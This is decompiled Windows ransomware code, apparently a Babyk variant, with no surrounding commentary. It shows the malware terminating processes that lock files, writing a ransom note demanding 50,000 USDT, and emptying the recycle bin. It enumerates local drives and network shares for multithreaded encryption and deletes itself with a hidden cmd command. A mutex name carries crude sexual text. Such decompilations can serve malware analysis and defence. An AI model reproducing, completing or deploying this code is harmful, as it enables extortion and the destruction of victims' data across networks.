    v8 = RmRegisterResources(pSessionHandle, 1u, &lpString, 0, nullptr, 0, nullptr);
    v9 = v8 == 0;
    if ( v8 != 0 )
    {
      if ( dword_140027180 != 0 )
      {
        v31 = lstrlenW(lpString);
        v32 = WideCharToMultiByte(0xFDE9u, 0, lpString, v31, nullptr, 0, nullptr, nullptr);
        v28 = (CHAR *)sub_140016FD0(v32);
        v33 = lstrlenW(lpString);
        WideCharToMultiByte(0xFDE9u, 0, lpString, v33, v28, v32, nullptr, nullptr);
        v30 = "Can't RmRegisterResources";
        goto LABEL_22;
      }
    }
    else
    {
      pnProcInfo = 10;
      List = RmGetList(pSessionHandle, &pnProcInfoNeeded, &pnProcInfo, rgAffectedApps, &dwRebootReasons);
      v9 = List == 0;
      if ( List == 0 )
      {
        for ( i = 0; i < pnProcInfo; ++i )
        {
          v12 = i;
          ApplicationType = rgAffectedApps[v12].ApplicationType;
          if ( ApplicationType != RmExplorer && ApplicationType != RmCritical )
          {
            CurrentProcessId = GetCurrentProcessId();
            dwProcessId = rgAffectedApps[i].Process.dwProcessId;
            if ( CurrentProcessId != dwProcessId )
            {
              v16 = OpenProcess(0x100001u, false, dwProcessId);
              v17 = v16;
              if ( v16 == (HANDLE)-1LL )
              {
                if ( dword_140027180 != 0 )
                {
                  strAppName = rgAffectedApps[v12].strAppName;
                  v19 = lstrlenW(rgAffectedApps[v12].strAppName);
                  v20 = WideCharToMultiByte(
                          0xFDE9u,
                          0,
                          rgAffectedApps[v12].strAppName,
                          v19,
                          nullptr,
                          0,
                          nullptr,
                          nullptr);
                  v21 = sub_140016FD0(v20);
                  v22 = rgAffectedApps[v12].strAppName;
                  v23 = (CHAR *)v21;
                  v24 = lstrlenW(v22);
                  WideCharToMultiByte(0xFDE9u, 0, strAppName, v24, v23, v20, nullptr, nullptr);
                  v25 = GetLastError();
                  sub_1400118E0("Can't OpenProcess", v23, v25);
                  sub_140017010(v23);
                }
              }
              else
              {
                TerminateProcess(v16, 0);
                WaitForSingleObject(v17, 0x1388u);
                CloseHandle(v17);
              }
            }
          }
        }
        goto LABEL_23;
      }
      if ( dword_140027180 != 0 )
      {
        v26 = lstrlenW(lpString);
        v27 = WideCharToMultiByte(0xFDE9u, 0, lpString, v26, nullptr, 0, nullptr, nullptr);
        v28 = (CHAR *)sub_140016FD0(v27);
        v29 = lstrlenW(lpString);
        WideCharToMultiByte(0xFDE9u, 0, lpString, v29, v28, v27, nullptr, nullptr);
        v30 = "Can't RmGetList";
LABEL_22:
        sub_1400118E0(v30, v28, v9);
        sub_140017010(v28);
      }
    }
LABEL_23:
    RmEndSession(pSessionHandle);
    v5 = 0;
    FileW = CreateFileW(v3, 0xC0000000, 0, nullptr, 3u, 0x8000000u, nullptr);
    LODWORD(v2) = sub_140017010(v3);
    if ( FileW != (HANDLE)-1LL )
      goto LABEL_24;
  }
  if ( dword_140027180 != 0 )
  {
    v45 = lstrlenW(lpString);
    v46 = WideCharToMultiByte(0xFDE9u, 0, lpString, v45, nullptr, 0, nullptr, nullptr);
    v40 = (CHAR *)sub_140016FD0(v46);
    v47 = lstrlenW(lpString);
    WideCharToMultiByte(0xFDE9u, 0, lpString, v47, v40, v46, nullptr, nullptr);
    v48 = GetLastError();
    v44 = v40;
    v43 = "Can't open file after killHolder";
    v42 = v48;
LABEL_31:
    sub_1400118E0(v43, v44, v42);
    LODWORD(v2) = sub_140017010(v40);
  }
  return (int)v2;
}


// ----- sub_140012FF0 @ 0x140012ff0 -----
WCHAR *__fastcall sub_140012FF0(LPCWCH lpWideCharStr)
{
  WCHAR *result; // rax
  WCHAR *v3; // rsi
  HANDLE FileW; // rbx
  DWORD v5; // eax
  HANDLE FirstFileW; // rdi
  int v7; // ebx
  __int64 v8; // rax
  WCHAR *v9; // rbx
  const WCHAR *i; // rbx
  int v11; // eax
  int v12; // ebx
  CHAR *v13; // rdi
  int v14; // eax
  DWORD LastError; // eax
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+40h] [rbp-278h] BYREF
  int v17; // [rsp+2C8h] [rbp+10h] BYREF
  DWORD NumberOfBytesWritten; // [rsp+2D0h] [rbp+18h] BYREF

  result = (WCHAR *)sub_140016FD0(0x10000);
  v3 = result;
  if ( result != nullptr )
  {
    lstrcpyW(result, lpWideCharStr);
    lstrcatW(v3, L"\\see hello.txt");
    FileW = CreateFileW(v3, 0x40000000u, 1u, nullptr, 1u, 0, nullptr);
    if ( FileW != (HANDLE)-1LL )
    {
      v5 = lstrlenA(
             "I am very sorry when you see this letter. Your computer has now been encrypted, and please do not move or m"
             "odify anything on this computer beforehand. The internal network is slowly being infected, and the backup s"
             "erver may have already been compromised. Please send 50,000 USDT to this address within 5 days, and we will"
             " ensure that your data is not damaged and will be restored. Wishing you a pleasant day.");
      WriteFile(
        FileW,
        "I am very sorry when you see this letter. Your computer has now been encrypted, and please do not move or modify"
        " anything on this computer beforehand. The internal network is slowly being infected, and the backup server may "
        "have already been compromised. Please send 50,000 USDT to this address within 5 days, and we will ensure that yo"
        "ur data is not damaged and will be restored. Wishing you a pleasant day.",
        v5,
        &NumberOfBytesWritten,
        nullptr);
      CloseHandle(FileW);
    }
    lstrcpyW(v3, lpWideCharStr);
    lstrcatW(v3, L"\\*");
    FirstFileW = FindFirstFileW(v3, &FindFileData);
    if ( FirstFileW == (HANDLE)-1LL )
    {
      if ( dword_140027180 != 0 )
      {
        v11 = lstrlenW(lpWideCharStr);
        v12 = WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, v11, nullptr, 0, nullptr, nullptr);
        v13 = (CHAR *)sub_140016FD0(v12);
        v14 = lstrlenW(lpWideCharStr);
        WideCharToMultiByte(0xFDE9u, 0, lpWideCharStr, v14, v13, v12, nullptr, nullptr);
        LastError = GetLastError();
        sub_1400118E0("Can't FindFirstFileW", v13, LastError);
        sub_140017010(v13);
      }
    }
    else
    {
      do
      {
        v7 = 0;
        while ( lstrcmpiW(FindFileData.cFileName, (LPCWSTR)qword_140026260[v7]) != 0 )
        {
          if ( (unsigned int)++v7 >= 0x1B )
          {
            lstrcpyW(v3, lpWideCharStr);
            lstrcatW(v3, L"\\");
            lstrcatW(v3, FindFileData.cFileName);
            if ( (FindFileData.dwFileAttributes & 0x10) == 0 && lstrcmpW(FindFileData.cFileName, L"see hello.txt") != 0 )
            {
              v8 = (unsigned int)(lstrlenW(FindFileData.cFileName) - 1);
              if ( (int)v8 < 0 )
                goto LABEL_17;
              while ( 1 )
              {
                v9 = &FindFileData.cFileName[v8];
                if ( *v9 == 46 )
                  break;
                v8 = (unsigned int)(v8 - 1);
                if ( (int)v8 < 0 )
                  goto LABEL_17;
              }
              if ( lstrcmpiW(&FindFileData.cFileName[v8], L".exe") != 0
                && lstrcmpiW(v9, L".dll") != 0
                && lstrcmpiW(v9, L".babyk") != 0 )
              {
LABEL_17:
                while ( (unsigned int)sub_140017B10(&unk_1400270E0, v3, 0) == 0 )
                {
                  v17 = 0;
                  for ( i = (const WCHAR *)sub_140017A60(&unk_1400270E0, 0, &v17);
                        i != nullptr;
                        i = (const WCHAR *)sub_140017A60(&unk_1400270E0, 0, &v17) )
                  {
                    sub_140011D70(i);
                    sub_140017010(i);
                  }
                }
              }
            }
            break;
          }
        }
      }
      while ( FindNextFileW(FirstFileW, &FindFileData) );
      FindClose(FirstFileW);
    }
    return (WCHAR *)sub_140017010(v3);
  }
  return result;
}


// ----- sub_140013370 @ 0x140013370 -----
WCHAR *__fastcall sub_140013370(const WCHAR *a1)
{
  WCHAR *result; // rax
  const WCHAR *i; // rbx
  WCHAR *v4; // rsi
  HANDLE FirstFileW; // rdi
  int v6; // ebx
  int v7; // eax
  int cbMultiByte; // ebx
  CHAR *lpMultiByteStr; // rdi
  int v10; // eax
  DWORD LastError; // eax
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+40h] [rbp-268h] BYREF
  char v13; // [rsp+2B8h] [rbp+10h] BYREF

  result = (WCHAR *)sub_1400123A0((__int64)a1);
  if ( (_DWORD)result == 0 )
  {
    while ( (unsigned int)sub_140017B10(&unk_140027130, a1, 0) == 0 )
    {
      for ( i = (const WCHAR *)sub_140017A60(&unk_1400270E0, 0, &v13);
            i != nullptr;
            i = (const WCHAR *)sub_140017A60(&unk_1400270E0, 0, &v13) )
      {
        sub_140011D70(i);
        sub_140017010(i);
      }
    }
    result = (WCHAR *)sub_140016FD0(0x10000);
    v4 = result;
    if ( result != nullptr )
    {
      lstrcpyW(result, a1);
      lstrcatW(v4, L"\\*");
      FirstFileW = FindFirstFileW(v4, &FindFileData);
      if ( FirstFileW == (HANDLE)-1LL )
      {
        if ( dword_140027180 != 0 )
        {
          v7 = lstrlenW(a1);
          cbMultiByte = WideCharToMultiByte(0xFDE9u, 0, a1, v7, nullptr, 0, nullptr, nullptr);
          lpMultiByteStr = (CHAR *)sub_140016FD0(cbMultiByte);
          v10 = lstrlenW(a1);
          WideCharToMultiByte(0xFDE9u, 0, a1, v10, lpMultiByteStr, cbMultiByte, nullptr, nullptr);
          LastError = GetLastError();
          sub_1400118E0("Can't FindFirstFileW", lpMultiByteStr, LastError);
          sub_140017010(lpMultiByteStr);
        }
      }
      else
      {
        do
        {
          if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
          {
            v6 = 0;
            while ( lstrcmpiW(FindFileData.cFileName, (LPCWSTR)qword_140026260[v6]) != 0 )
            {
              if ( (unsigned int)++v6 >= 0x1B )
              {
                lstrcpyW(v4, a1);
                lstrcatW(v4, L"\\");
                lstrcatW(v4, FindFileData.cFileName);
                if ( (unsigned int)sub_1400123A0((__int64)v4) == 0 )
                  sub_140013370(v4);
                break;
              }
            }
          }
        }
        while ( FindNextFileW(FirstFileW, &FindFileData) );
        FindClose(FirstFileW);
      }
      return (WCHAR *)sub_140017010(v4);
    }
  }
  return result;
}


// ----- sub_1400135F0 @ 0x1400135f0 -----
void __fastcall __noreturn sub_1400135F0(LPVOID lpThreadParameter)
{
  const WCHAR *v1; // rax
  const WCHAR *v2; // rbx
  const WCHAR *i; // rbx
  const WCHAR *j; // rbx
  int v5; // [rsp+30h] [rbp+8h] BYREF

  v5 = 0;
  if ( lpThreadParameter != nullptr )
  {
    while ( 1 )
    {
      v1 = (const WCHAR *)sub_140017A60(&unk_140027130, 0, &v5);
      v2 = v1;
      if ( v1 != nullptr )
      {
        sub_140012FF0(v1);
        sub_140017010(v2);
      }
      else if ( v5 != -1 )
      {
        goto LABEL_10;
      }
      for ( i = (const WCHAR *)sub_140017A60(&unk_1400270E0, 0, &v5);
            i != nullptr;
            i = (const WCHAR *)sub_140017A60(&unk_1400270E0, 0, &v5) )
      {
        sub_140012570(i);
        sub_140017010(i);
      }
    }
  }
  for ( j = (const WCHAR *)sub_140017A60(&unk_1400270E0, 1, &v5);
        j != nullptr;
        j = (const WCHAR *)sub_140017A60(&unk_1400270E0, 1, &v5) )
  {
    sub_140012570(j);
    sub_140017010(j);
  }
LABEL_10:
  ExitThread(0);
}


// ----- sub_1400136F0 @ 0x1400136f0 -----
DWORD __fastcall sub_1400136F0(struct _NETRESOURCEW *a1)
{
  DWORD result; // eax
  char *v2; // rax
  char *v3; // r15
  DWORD i; // r14d
  char *v5; // rax
  const WCHAR *v6; // rbp
  const WCHAR *j; // rbx
  WCHAR *v8; // rax
  WCHAR *v9; // rsi
  HANDLE FirstFileW; // rdi
  int v11; // ebx
  int v12; // eax
  __int64 cbMultiByte; // rbx
  CHAR *v14; // rdi
  int v15; // eax
  DWORD LastError; // eax
  HANDLE hEnum; // [rsp+40h] [rbp-298h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+50h] [rbp-288h] BYREF
  DWORD cCount; // [rsp+2E8h] [rbp+10h] BYREF
  DWORD BufferSize; // [rsp+2F0h] [rbp+18h] BYREF
  char v21; // [rsp+2F8h] [rbp+20h] BYREF

  cCount = -1;
  BufferSize = 0x4000;
  result = WNetOpenEnumW(2u, 0, 0x13u, a1, &hEnum);
  if ( result == 0 )
  {
    v2 = (char *)sub_140016FD0(BufferSize);
    v3 = v2;
    if ( v2 != nullptr )
    {
      if ( WNetEnumResourceW(hEnum, &cCount, v2, &BufferSize) == 0 )
      {
        do
        {
          for ( i = 0; i < cCount; ++i )
          {
            v5 = &v3[48 * i];
            if ( (v5[12] & 2) != 0 )
            {
              sub_1400136F0(&v3[48 * i]);
            }
            else
            {
              v6 = *((const WCHAR **)v5 + 3);
              if ( (unsigned int)sub_1400123A0((__int64)v6) == 0 )
              {
                while ( (unsigned int)sub_140017B10(&unk_140027130, v6, 0) == 0 )
                {
                  for ( j = (const WCHAR *)sub_140017A60(&unk_1400270E0, 0, &v21);
                        j != nullptr;
                        j = (const WCHAR *)sub_140017A60(&unk_1400270E0, 0, &v21) )
                  {
                    sub_140011D70(j);
                    sub_140017010(j);
                  }
                }
                v8 = (WCHAR *)sub_140016FD0(0x10000);
                v9 = v8;
                if ( v8 != nullptr )
                {
                  lstrcpyW(v8, v6);
                  lstrcatW(v9, L"\\*");
                  FirstFileW = FindFirstFileW(v9, &FindFileData);
                  if ( FirstFileW == (HANDLE)-1LL )
                  {
                    if ( dword_140027180 != 0 )
                    {
                      v12 = lstrlenW(v6);
                      cbMultiByte = WideCharToMultiByte(0xFDE9u, 0, v6, v12, nullptr, 0, nullptr, nullptr);
                      v14 = (CHAR *)sub_140016FD0(cbMultiByte);
                      v15 = lstrlenW(v6);
                      WideCharToMultiByte(0xFDE9u, 0, v6, v15, v14, cbMultiByte, nullptr, nullptr);
                      LastError = GetLastError();
                      sub_1400118E0("Can't FindFirstFileW", v14, LastError);
                      sub_140017010(v14);
                    }
                  }
                  else
                  {
                    do
                    {
                      if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
                      {
                        v11 = 0;
                        while ( lstrcmpiW(FindFileData.cFileName, (LPCWSTR)qword_140026260[v11]) != 0 )
                        {
                          if ( (unsigned int)++v11 >= 0x1B )
                          {
                            lstrcpyW(v9, v6);
                            lstrcatW(v9, L"\\");
                            lstrcatW(v9, FindFileData.cFileName);
                            if ( (unsigned int)sub_1400123A0((__int64)v9) == 0 )
                              sub_140013370(v9);
                            break;
                          }
                        }
                      }
                    }
                    while ( FindNextFileW(FirstFileW, &FindFileData) );
                    FindClose(FirstFileW);
                  }
                  sub_140017010(v9);
                }
              }
            }
          }
        }
        while ( WNetEnumResourceW(hEnum, &cCount, v3, &BufferSize) == 0 );
      }
      sub_140017010(v3);
    }
    return WNetCloseEnum(hEnum);
  }
  return result;
}


// ----- sub_140013AA0 @ 0x140013aa0 -----
DWORD __fastcall sub_140013AA0(LPWSTR servername)
{
  DWORD result; // eax
  DWORD v3; // r13d
  LPBYTE v4; // r14
  DWORD v5; // r15d
  int v6; // edi
  __int64 v7; // rbx
  __int64 v8; // rsi
  WCHAR v9; // ax
  const WCHAR *i; // rbx
  WCHAR *v11; // rax
  WCHAR *v12; // rsi
  HANDLE FirstFileW; // rdi
  __int64 v14; // rbx
  int v15; // eax
  int v16; // ebx
  CHAR *v17; // rdi
  int v18; // eax
  DWORD LastError; // eax
  _BYTE v20[8]; // [rsp+40h] [rbp-C0h] BYREF
  LPBYTE bufptr; // [rsp+48h] [rbp-B8h] BYREF
  WCHAR String1[104]; // [rsp+50h] [rbp-B0h] BYREF
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+120h] [rbp+20h] BYREF
  DWORD entriesread; // [rsp+3B8h] [rbp+2B8h] BYREF
  DWORD resume_handle; // [rsp+3C0h] [rbp+2C0h] BYREF
  DWORD totalentries; // [rsp+3C8h] [rbp+2C8h] BYREF

  entriesread = 0;
  totalentries = 0;
  resume_handle = 0;
  do
  {
    result = NetShareEnum(servername, 1u, &bufptr, 0xFFFFFFFF, &entriesread, &totalentries, &resume_handle);
    v3 = result;
    if ( result != 0 && result != 234 )
      break;
    v4 = bufptr;
    v5 = 1;
    if ( entriesread != 0 )
    {
      do
      {
        if ( (*((_DWORD *)v4 + 2) & 0x7FFFFFFF) == 0
          && lstrlenW(*(LPCWSTR *)v4) > 2
          && lstrcmpW(*(LPCWSTR *)v4, L"ADMIN$") != 0 )
        {
          lstrcpyW(String1, L"\\\\");
          lstrcatW(String1, servername);
          lstrcatW(String1, L"\\");
          lstrcatW(String1, *(LPCWSTR *)v4);
          v6 = 0;
          if ( off_140026340[0] != nullptr )
          {
            while ( 1 )
            {
              v7 = v6;
              v8 = lstrlenW(off_140026340[v6]);
              if ( (unsigned int)sub_14001A180(String1, off_140026340[v6], v8) == 0 )
              {
                v9 = String1[v8];
                if ( v9 == 92 || v9 == 0 )
                  break;
              }
              ++v6;
              if ( off_140026348[v7] == nullptr )
                goto LABEL_13;
            }
          }
          else
          {
LABEL_13:
            while ( (unsigned int)sub_140017B10(&unk_140027130, String1, 0) == 0 )
            {
              for ( i = (const WCHAR *)sub_140017A60(&unk_1400270E0, 0, v20);
                    i != nullptr;
                    i = (const WCHAR *)sub_140017A60(&unk_1400270E0, 0, v20) )
              {
                sub_140011D70(i);
                sub_140017010(i);
              }
            }
            v11 = (WCHAR *)sub_140016FD0(0x10000);
            v12 = v11;
            if ( v11 != nullptr )
            {
              lstrcpyW(v11, String1);
              lstrcatW(v12, L"\\*");
              FirstFileW = FindFirstFileW(v12, &FindFileData);
              if ( FirstFileW == (HANDLE)-1LL )
              {
                if ( dword_140027180 != 0 )
                {
                  v15 = lstrlenW(String1);
                  v16 = WideCharToMultiByte(0xFDE9u, 0, String1, v15, nullptr, 0, nullptr, nullptr);
                  v17 = (CHAR *)sub_140016FD0(v16);
                  v18 = lstrlenW(String1);
                  WideCharToMultiByte(0xFDE9u, 0, String1, v18, v17, v16, nullptr, nullptr);
                  LastError = GetLastError();
                  sub_1400118E0("Can't FindFirstFileW", v17, LastError);
                  sub_140017010(v17);
                }
              }
              else
              {
                do
                {
                  if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
                  {
                    v14 = 0;
                    while ( lstrcmpiW(FindFileData.cFileName, (LPCWSTR)qword_140026260[v14]) != 0 )
                    {
                      v14 = (unsigned int)(v14 + 1);
                      if ( (unsigned int)v14 >= 0x1B )
                      {
                        lstrcpyW(v12, String1);
                        lstrcatW(v12, L"\\");
                        lstrcatW(v12, FindFileData.cFileName);
                        if ( (unsigned int)sub_1400123A0((__int64)v12) == 0 )
                          sub_140013370(v12);
                        break;
                      }
                    }
                  }
                }
                while ( FindNextFileW(FirstFileW, &FindFileData) );
                FindClose(FirstFileW);
              }
              sub_140017010(v12);
            }
          }
        }
        v4 += 24;
        ++v5;
      }
      while ( v5 <= entriesread );
      v4 = bufptr;
    }
    result = NetApiBufferFree(v4);
  }
  while ( v3 == 234 );
  return result;
}


// ----- sub_140013EB0 @ 0x140013eb0 -----
WCHAR *__fastcall sub_140013EB0(WCHAR a1)
{
  WCHAR *result; // rax
  WCHAR *v3; // rbx
  UINT DriveTypeW; // eax
  WCHAR *v5; // rax
  const WCHAR *v6; // rdi
  DWORD nLength; // [rsp+38h] [rbp+10h] BYREF

  result = (WCHAR *)sub_140016FD0(14);
  v3 = result;
  if ( result != nullptr )
  {
    lstrcpyW(result, L"\\\\?\\");
    lstrcpyW(v3 + 5, L":");
    v3[4] = a1;
    DriveTypeW = GetDriveTypeW(v3);
    if ( DriveTypeW != 0 && DriveTypeW != 5 )
    {
      if ( DriveTypeW == 4 )
      {
        nLength = 260;
        v5 = (WCHAR *)sub_140016FD0(520);
        v6 = v5;
        if ( v5 != nullptr )
        {
          if ( WNetGetConnectionW(v3 + 4, v5, &nLength) == 0 )
            sub_140013370(v6);
          sub_140017010(v6);
        }
      }
      else
      {
        sub_140013370(v3);
      }
    }
    return (WCHAR *)sub_140017010(v3);
  }
  return result;
}


// ----- start @ 0x140013f80 -----
void __noreturn start()
{
  const WCHAR *CommandLineW; // rax
  LPWSTR *v1; // r15
  const WCHAR *v2; // rax
  __int64 v3; // r14
  const HANDLE *v4; // r13
  __int64 v5; // rax
  const HANDLE *v6; // r12
  signed int i; // edi
  __int64 v8; // rbx
  __int128 v9; // rdi
  int v10; // r15d
  int v11; // eax
  __int64 k; // rdx
  int v13; // eax
  WCHAR *v14; // rbx
  int v15; // eax
  __int64 m; // rdx
  int v17; // eax
  WCHAR *v18; // rbx
  DWORD LogicalDrives; // edi
  WCHAR j; // bx
  unsigned int v21; // ebx
  unsigned int v22; // ebx
  signed int v23; // edi
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+50h] [rbp-B0h] BYREF
  struct _STARTUPINFOW StartupInfo; // [rsp+70h] [rbp-90h] BYREF
  struct _SYSTEM_INFO SystemInfo; // [rsp+E0h] [rbp-20h] BYREF
  WCHAR Filename[264]; // [rsp+110h] [rbp+10h] BYREF
  WCHAR CommandLine[520]; // [rsp+320h] [rbp+220h] BYREF
  int pNumArgs; // [rsp+760h] [rbp+660h] BYREF

  if ( !sub_14000B540() )
  {
    if ( (unsigned int)sub_14000B790() != 0 )
      Sleep(0x1388u);
    if ( (unsigned int)sub_14000BCF0() == 0 && (unsigned int)sub_14000C210() != 0 )
    {
      nullsub_1();
      sub_140016F20();
      if ( (unsigned int)sub_140016470() == 0 )
        ExitProcess(1u);
      hProv = sub_14000B3A0();
      if ( hProv != 0 )
      {
        pNumArgs = 0;
        CommandLineW = GetCommandLineW();
        v1 = CommandLineToArgvW(CommandLineW, &pNumArgs);
        SetProcessShutdownParameters(0, 0);
        v2 = sub_14000C320(pNumArgs, (__int64)v1, L"debug");
        if ( v2 != nullptr )
        {
          qword_140026260[0] = (__int64)v2;
          sub_140011A30(v2);
          dword_140027180 = 1;
        }
        sub_14000AFE0();
        sub_14000B2C0();
        sub_14000AEB0();
        SHEmptyRecycleBinA(nullptr, nullptr, 7u);
        GetSystemInfo(&SystemInfo);
        v3 = (4 * SystemInfo.dwNumberOfProcessors) >> 1;
        sub_1400179F0(&unk_1400270E0, 24 * SystemInfo.dwNumberOfProcessors);
        sub_1400179F0(&unk_140027130, (unsigned int)(3 * v3));
        v4 = (const HANDLE *)sub_140016FD0(8 * v3);
        v5 = sub_140016FD0(8 * v3);
        v6 = (const HANDLE *)v5;
        if ( v4 != nullptr && v5 != 0 )
        {
          sub_140016F40(v4, 0, 8 * v3);
          sub_140016F40(v6, 0, 8 * v3);
          for ( i = 0;
                i < (unsigned int)v3;
                v6[v8] = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)sub_1400135F0, nullptr, 0, nullptr) )
          {
            v8 = i;
            v4[i++] = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)sub_1400135F0, (LPVOID)1, 0, nullptr);
          }
          *((_QWORD *)&v9 + 1) = sub_14000C320(pNumArgs, (__int64)v1, L"shares");
          *(_QWORD *)&v9 = sub_14000C320(pNumArgs, (__int64)v1, L"paths");
          if ( v9 == 0 )
          {
            if ( OpenMutexA(0x1F0001u, false, "DoYouWantToHaveSexWithCuongDong") == nullptr )
            {
              CreateMutexA(nullptr, false, "DoYouWantToHaveSexWithCuongDong");
              if ( sub_14000C250(pNumArgs, (__int64)v1, L"sf") == 1 )
                sub_1400136F0(nullptr);
              sub_14000AC40();
              LogicalDrives = GetLogicalDrives();
              if ( LogicalDrives != 0 )
              {
                for ( j = 65; j <= 0x5Au; ++j )
                {
                  if ( (LogicalDrives & 1) != 0 )
                    sub_140013EB0(j);
                  LogicalDrives >>= 1;
                }
              }
              if ( sub_14000C250(pNumArgs, (__int64)v1, L"sf") == 0 )
                sub_1400136F0(nullptr);
            }
          }
          else
          {
            if ( *((_QWORD *)&v9 + 1) != 0 )
            {
              v10 = 1;
              v11 = lstrlenW(*((LPCWSTR *)&v9 + 1));
              for ( k = 0; (int)k < v11; k = (unsigned int)(k + 1) )
              {
                if ( *(_WORD *)(*((_QWORD *)&v9 + 1) + 2 * k) == 44 )
                {
                  *(_WORD *)(*((_QWORD *)&v9 + 1) + 2 * k) = 0;
                  ++v10;
                }
              }
              do
              {
                v13 = lstrlenW(*((LPCWSTR *)&v9 + 1));
                v14 = (WCHAR *)sub_140016FD0(2LL * (v13 + 1));
                lstrcpyW(v14, *((LPCWSTR *)&v9 + 1));
                sub_140013AA0(v14);
                sub_140017010(v14);
                *((_QWORD *)&v9 + 1) += 2LL * (lstrlenW(*((LPCWSTR *)&v9 + 1)) + 1);
                --v10;
              }
              while ( v10 != 0 );
            }
            if ( (_QWORD)v9 != 0 )
            {
              DWORD2(v9) = 1;
              v15 = lstrlenW((LPCWSTR)v9);
              for ( m = 0; (int)m < v15; m = (unsigned int)(m + 1) )
              {
                if ( *(_WORD *)(v9 + 2 * m) == 44 )
                {
                  *(_WORD *)(v9 + 2 * m) = 0;
                  ++DWORD2(v9);
                }
              }
              do
              {
                v17 = lstrlenW((LPCWSTR)v9);
                v18 = (WCHAR *)sub_140016FD0(2LL * v17 + 2);
                lstrcpyW(v18, (LPCWSTR)v9);
                if ( lstrlenW(v18) == 2 && v18[1] == 58 )
                  sub_140013EB0(*v18);
                else
                  sub_140013370(v18);
                sub_140017010(v18);
                *(_QWORD *)&v9 = v9 + 2LL * (lstrlenW((LPCWSTR)v9) + 1);
                --DWORD2(v9);
              }
              while ( DWORD2(v9) != 0 );
            }
          }
          v21 = 0;
          if ( (_DWORD)v3 != 0 )
          {
            do
            {
              sub_140017B10(&unk_140027130, 0, 1);
              ++v21;
            }
            while ( v21 < (unsigned int)v3 );
            WaitForMultipleObjects(v3, v4, true, 0xFFFFFFFF);
            v22 = 0;
            do
            {
              sub_140017B10(&unk_1400270E0, 0, 1);
              ++v22;
            }
            while ( v22 < (unsigned int)v3 );
            WaitForMultipleObjects(v3, v6, true, 0xFFFFFFFF);
            sub_14000AEB0();
            v23 = 0;
            do
            {
              CloseHandle(v4[v23]);
              CloseHandle(v6[v23++]);
            }
            while ( v23 < (unsigned int)v3 );
          }
          else
          {
            WaitForMultipleObjects(0, v4, true, 0xFFFFFFFF);
            WaitForMultipleObjects(0, v6, true, 0xFFFFFFFF);
            sub_14000AEB0();
          }
          sub_140017010(v4);
          sub_140017010(v6);
        }
        if ( dword_140027180 != 0 )
          sub_140011A90();
        CryptReleaseContext(hProv, 0);
      }
      GetModuleFileNameW(nullptr, Filename, 0x104u);
      wsprintfW(CommandLine, L"/c ping 127.0.0.1 -n 2 > nul & del /f /q \"%s\"", Filename);
      StartupInfo.cb = 104;
      memset(&StartupInfo.dwFillAttribute, 0, 48);
      StartupInfo.dwFlags = 1;
      StartupInfo.wShowWindow = 0;
      memset(&StartupInfo.lpReserved, 0, 48);
      CreateProcessW(
        L"C:\\Windows\\System32\\cmd.exe",
        CommandLine,
        nullptr,
        nullptr,
        false,
        0x8000008u,
        nullptr,
        nullptr,
        &StartupInfo,
        &ProcessInformation);
      if ( ProcessInformation.hProcess != nullptr )
      {
        CloseHandle(ProcessInformation.hProcess);
        CloseHandle(ProcessInformation.hThread);
      }
    }
  }
  ExitProcess(0);
}


// ----- sub_1400145B0 @ 0x1400145b0 -----
__int64 __fastcall sub_1400145B0(_DWORD *a1, int *a2)
{
  unsigned int v2; // r8d
  __int64 v4; // rbx
  __int16 v5; // di
  __int64 v6; // rdi
  int v7; // r8d
  __int64 v8; // r9
  int v9; // edx
  __int64 v10; // r8
  int v11; // edx
  __int64 v12; // r9
  int v13; // edx
  __int64 v14; // r8
  int v15; // edx
  __int64 v16; // r9
  int v17; // edx
  __int64 v18; // r8
  int v19; // edx
  __int64 v20; // r9
  int v21; // edx
  __int64 v22; // r8
  int v23; // edx
  __int64 v24; // r9
  int v25; // edx
  __int64 v26; // r8
  int v27; // edx
  __int64 v28; // r9
  int v29; // edx
  __int64 v30; // r8
  int v31; // edx
  __int64 v32; // r9
  int v33; // edx
  __int64 v34; // r10
  int v35; // edx
  __int64 v36; // r8
  int v37; // edx
  __int64 result; // rax
  int v39; // r8d
  __int64 v40; // rdx
  __int64 v41; // r9
  __int64 v42; // r8
  __int64 v43; // r9
  __int64 v44; // r8
  __int64 v45; // r9
  __int64 v46; // r8
  __int64 v47; // r9
  __int64 v48; // r8
  __int64 v49; // r9
  __int64 v50; // r8
  __int64 v51; // r9
  __int64 v52; // r8
  __int64 v53; // r9
  __int64 v54; // r8
  __int64 v55; // r9

  v2 = a1[1056];
  v4 = v2 & 0x1FF;
  v5 = (a1[1056] & 0x1FF) + 16;
  a1[1056] = ((_WORD)v2 + 16) & 0x3FF;
  v6 = v5 & 0x1FF;
  if ( v2 >= 0x200 )
  {
    v39 = a1[(unsigned __int8)a1[1044]] + a1[(unsigned __int8)BYTE2(a1[1044]) + 256];
    v40 = (unsigned int)(v4 + 512);
    v41 = (unsigned int)(v4 + 513);
    a1[v40] += __ROR4__(a1[1046], 24) + (__ROR4__(a1[v41], 9) ^ __ROR4__(a1[1053], 22));
    a1[1040] = a1[v40];
    *a2 = a1[v40] ^ v39;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1045]) + 256] + a1[(unsigned __int8)a1[1045]];
    v42 = (unsigned int)(v4 + 514);
    a1[v41] += __ROR4__(a1[1047], 24) + (__ROR4__(a1[v42], 9) ^ __ROR4__(a1[1054], 22));
    a1[1041] = a1[v41];
    a2[1] = a1[v41] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1046]) + 256] + a1[(unsigned __int8)a1[1046]];
    v43 = (unsigned int)(v4 + 515);
    a1[v42] += __ROR4__(a1[1048], 24) + (__ROR4__(a1[v43], 9) ^ __ROR4__(a1[1055], 22));
    a1[1042] = a1[v42];
    a2[2] = a1[v42] ^ v40;
    LODWORD(v40) = a1[(unsigned __int8)BYTE2(a1[1047]) + 256] + a1[(unsigned __int8)a1[1047]];
    v44 = (unsigned int)(v4 + 516);
